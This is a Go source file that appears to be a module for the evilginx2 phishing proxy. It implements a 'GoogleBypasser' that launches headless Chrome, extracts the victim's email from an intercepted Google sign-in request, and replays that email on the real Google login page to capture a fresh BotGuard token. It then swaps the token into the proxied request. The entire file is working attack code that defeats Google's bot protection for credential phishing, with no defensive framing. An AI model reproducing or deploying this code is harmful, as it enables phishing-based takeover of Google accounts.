package core

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/go-rod/rod"
	"github.com/go-rod/rod/lib/input"
	"github.com/go-rod/rod/lib/launcher"
	"github.com/go-rod/rod/lib/proto"
	"github.com/kgretzky/evilginx2/log"
)

type GoogleBypasser struct {
	browser        *rod.Browser
	page           *rod.Page
	isHeadless     bool
	withDevTools   bool
	slowMotionTime time.Duration

	token string
	email string
}

var bgRegexp = regexp.MustCompile(`identity-signin-identifier\\",\\"([^"]+)`)

// chromeMutex prevents multiple goroutines from trying to start Chrome simultaneously
var chromeMutex sync.Mutex

// chromeReady indicates if Chrome has been pre-warmed and is ready
var chromeReady bool = false
var chromeReadyMutex sync.RWMutex

// PreWarmChrome should be called at startup to ensure Chrome is ready before any requests
// This prevents the "first request fails" issue by warming up Chrome ahead of time
func PreWarmChrome() error {
	log.Info("[GoogleBypasser] Pre-warming Chrome for BotGuard token generation...")

	// Ensure Chrome is running
	if err := ensureChromeRunning(); err != nil {
		log.Error("[GoogleBypasser] Failed to pre-warm Chrome: %v", err)
		return err
	}

	// Verify we can get a WebSocket URL
	wsURL, err := getWebSocketDebuggerURL()
	if err != nil {
		log.Error("[GoogleBypasser] Chrome running but WebSocket not available: %v", err)
		return err
	}

	log.Info("[GoogleBypasser] Chrome WebSocket URL: %s", wsURL)

	// Try to create a test page to verify Chrome is fully functional
	browser := rod.New().ControlURL(wsURL)
	if err := browser.Connect(); err != nil {
		log.Error("[GoogleBypasser] Failed to connect to Chrome: %v", err)
		return err
	}

	// Create a test page
	page, err := browser.Page(proto.TargetCreateTarget{URL: "about:blank"})
	if err != nil {
		log.Error("[GoogleBypasser] Failed to create test page: %v", err)
		browser.Close()
		return err
	}

	// Close the test page
	page.Close()
	browser.Close()

	// Mark Chrome as ready
	chromeReadyMutex.Lock()
	chromeReady = true
	chromeReadyMutex.Unlock()

	log.Success("[GoogleBypasser] Chrome pre-warmed and ready for BotGuard bypass!")
	return nil
}

// IsChromeReady returns true if Chrome has been pre-warmed
func IsChromeReady() bool {
	chromeReadyMutex.RLock()
	defer chromeReadyMutex.RUnlock()
	return chromeReady
}

// findChromeBinary finds the Chrome/Chromium binary path
func findChromeBinary() (string, error) {
	chromePaths := []string{
		"google-chrome",
		"google-chrome-stable",
		"chromium-browser",
		"chromium",
		"/usr/bin/google-chrome",
		"/usr/bin/google-chrome-stable",
		"/usr/bin/chromium-browser",
		"/usr/bin/chromium",
		"/opt/google/chrome/google-chrome",
		"/snap/bin/chromium",
	}

	for _, path := range chromePaths {
		if fullPath, err := exec.LookPath(path); err == nil {
			return fullPath, nil
		}
	}

	return "", fmt.Errorf("Chrome/Chromium binary not found. Please install Google Chrome or Chromium")
}

// isChromRunning checks if Chrome is running on port 9222
func isChromeRunning() bool {
	resp, err := http.Get("http://127.0.0.1:9222/json")
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	return resp.StatusCode == 200
}

// startChromeHeadless starts Chrome in headless mode with remote debugging
func startChromeHeadless() error {
	chromeMutex.Lock()
	defer chromeMutex.Unlock()

	// Double-check if Chrome is already running (another goroutine might have started it)
	if isChromeRunning() {
		log.Info("[GoogleBypasser] Chrome is already running on port 9222")
		return nil
	}

	chromePath, err := findChromeBinary()
	if err != nil {
		return err
	}

	log.Info("[GoogleBypasser] Starting Chrome headless: %s", chromePath)

	cmd := exec.Command(chromePath,
		"--headless",
		"--disable-gpu",
		"--no-sandbox",
		"--disable-dev-shm-usage",
		"--remote-debugging-port=9222",
		"--remote-debugging-address=127.0.0.1",
		"--disable-background-networking",
		"--disable-default-apps",
		"--disable-extensions",
		"--disable-sync",
		"--disable-translate",
		"--hide-scrollbars",
		"--metrics-recording-only",
		"--mute-audio",
		"--no-first-run",
		"--safebrowsing-disable-auto-update",
	)

	// Redirect output to /dev/null to prevent cluttering logs
	cmd.Stdout = nil
	cmd.Stderr = nil

	if err := cmd.Start(); err != nil {
		return fmt.Errorf("failed to start Chrome: %v", err)
	}

	log.Info("[GoogleBypasser] Chrome process started with PID: %d", cmd.Process.Pid)

	// Wait for Chrome to be ready (up to 10 seconds)
	for i := 0; i < 20; i++ {
		time.Sleep(500 * time.Millisecond)
		if isChromeRunning() {
			log.Success("[GoogleBypasser] Chrome is now running on port 9222")
			return nil
		}
	}

	return fmt.Errorf("Chrome started but not responding on port 9222 after 10 seconds")
}

// ensureChromeRunning ensures Chrome is running, starting it if necessary
func ensureChromeRunning() error {
	maxRetries := 3

	for attempt := 1; attempt <= maxRetries; attempt++ {
		if isChromeRunning() {
			return nil
		}

		log.Warning("[GoogleBypasser] Chrome not running (attempt %d/%d), starting...", attempt, maxRetries)

		if err := startChromeHeadless(); err != nil {
			log.Error("[GoogleBypasser] Failed to start Chrome: %v", err)
			if attempt < maxRetries {
				time.Sleep(2 * time.Second)
				continue
			}
			return err
		}

		// Verify Chrome is running after start
		if isChromeRunning() {
			return nil
		}
	}

	return fmt.Errorf("failed to ensure Chrome is running after %d attempts", maxRetries)
}

func getWebSocketDebuggerURL() (string, error) {
	resp, err := http.Get("http://127.0.0.1:9222/json")
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	var targets []map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&targets); err != nil {
		return "", err
	}

	if len(targets) == 0 {
		return "", fmt.Errorf("no targets found")
	}

	ws, ok := targets[0]["webSocketDebuggerUrl"].(string)
	if !ok || ws == "" {
		return "", fmt.Errorf("webSocketDebuggerUrl not found")
	}

	// Return the WebSocket debugger URL of the first target
	return ws, nil
}

// Use https://bot.sannysoft.com/ to test the Headless Browser detection. Just open that url in automated browser and check result.

func (b *GoogleBypasser) Launch() {
	log.Debug("[GoogleBypasser]: Launching Browser .. ")

	// First, ensure Chrome is running (auto-start if needed)
	if err := ensureChromeRunning(); err != nil {
		log.Error("[GoogleBypasser] Failed to ensure Chrome is running: %v", err)
		// Try fallback with go-rod launcher
		log.Warning("[GoogleBypasser] Attempting fallback with go-rod launcher...")
		l := launcher.New().Headless(b.isHeadless).Devtools(b.withDevTools)
		if os.Geteuid() == 0 {
			l = l.NoSandbox(true)
		}
		wsURL := l.MustLaunch()
		b.browser = rod.New().ControlURL(wsURL)
		if b.slowMotionTime > 0 {
			b.browser = b.browser.SlowMotion(b.slowMotionTime)
		}
		b.browser = b.browser.MustConnect()
		b.page = b.browser.MustPage()
		log.Debug("[GoogleBypasser]: Browser connected via fallback launcher.")
		return
	}

	// Get WebSocket debugger URL
	wsURL, err := getWebSocketDebuggerURL()
	if err != nil {
		log.Error("[GoogleBypasser] Failed to get WebSocket debugger URL: %v", err)
		// Try to restart Chrome and get URL again
		if restartErr := startChromeHeadless(); restartErr != nil {
			log.Error("[GoogleBypasser] Failed to restart Chrome: %v", restartErr)
			return
		}
		wsURL, err = getWebSocketDebuggerURL()
		if err != nil {
			log.Error("[GoogleBypasser] Still failed to get WebSocket URL after restart: %v", err)
			return
		}
	}

	b.browser = rod.New().ControlURL(wsURL)
	if b.slowMotionTime > 0 {
		b.browser = b.browser.SlowMotion(b.slowMotionTime)
	}

	// Connect to the browser
	b.browser = b.browser.MustConnect()

	// Create a new page
	b.page = b.browser.MustPage()

	log.Debug("[GoogleBypasser]: Browser connected and page created.")
}

func (b *GoogleBypasser) GetEmail(body []byte) {
	//exp := regexp.MustCompile(`f\.req=\[\[\["V1UmUe","\[null,\\"(.*?)\\"`)
	exp := regexp.MustCompile(`f\.req=\[\[\["MI613e","\[null,\\"(.*?)\\"`)
	email_match := exp.FindSubmatch(body)
	matches := len(email_match)
	if matches < 2 {
		log.Error("[GoogleBypasser]: Found %v matches for email in request.", matches)
		return
	}
	log.Debug("[GoogleBypasser]: Found email in body : %v", string(email_match[1]))
	b.email = string(bytes.Replace(email_match[1], []byte("%40"), []byte("@"), -1))
	log.Debug("[GoogleBypasser]: Using email to obtain valid token : %v", b.email)
}

func (b *GoogleBypasser) GetToken() {
	stop := make(chan struct{})
	var once sync.Once
	timeout := time.After(200 * time.Second)

	go b.page.EachEvent(func(e *proto.NetworkRequestWillBeSent) {
		if strings.Contains(e.Request.URL, "/signin/_/AccountsSignInUi/data/batchexecute?") && strings.Contains(e.Request.URL, "rpcids=MI613e") {

			// Decode URL encoded body
			decodedBody, err := url.QueryUnescape(string(e.Request.PostData))
			if err != nil {
				log.Error("Failed to decode body while trying to obtain fresh botguard token: %v", err)
				return
			}
			b.token = bgRegexp.FindString(decodedBody)
			log.Debug("[GoogleBypasser]: Obtained Token : %v", b.token)
			once.Do(func() { close(stop) })
		}
	})()

	log.Debug("[GoogleBypasser]: Navigating to Google login page ...")
	err := b.page.Navigate("https://accounts.google.com/")
	if err != nil {
		log.Error("Failed to navigate to Google login page: %v", err)
		return
	}

	log.Debug("[GoogleBypasser]: Waiting for the email input field ...")
	emailField := b.page.MustWaitLoad().MustElement("#identifierId")
	if emailField == nil {
		log.Error("Failed to find the email input field")
		return
	}

	err = emailField.Input(b.email)
	if err != nil {
		log.Error("Failed to input email: %v", err)
		return
	}
	log.Debug("[GoogleBypasser]: Entered target email : %v", b.email)

	err = b.page.Keyboard.Press(input.Enter)
	if err != nil {
		log.Error("Failed to submit the login form: %v", err)
		return
	}
	log.Debug("[GoogleBypasser]: Submitted Login Form ...")

	//<-stop
	select {
	case <-stop:
		// Check if the token is empty
		for b.token == "" {
			select {
			case <-time.After(1 * time.Second): // Check every second
				log.Printf("[GoogleBypasser]: Waiting for token to be obtained...")
			case <-timeout:
				log.Printf("[GoogleBypasser]: Timed out while waiting to obtain the token")
				return
			}
		}
		//log.Printf("[GoogleBypasser]: Successfully obtained token: %v", b.token)
		// Close the page after obtaining the token
		err := b.page.Close()
		if err != nil {
			log.Error("Failed to close the page: %v", err)
		}
	case <-timeout:
		log.Printf("[GoogleBypasser]: Timed out while waiting to obtain the token")
		return
	}
}

func (b *GoogleBypasser) ReplaceTokenInBody(body []byte) []byte {
	log.Debug("[GoogleBypasser]: Old body : %v", string(body))
	newBody := bgRegexp.ReplaceAllString(string(body), b.token)
	log.Debug("[GoogleBypasser]: New body : %v", newBody)
	return []byte(newBody)
}
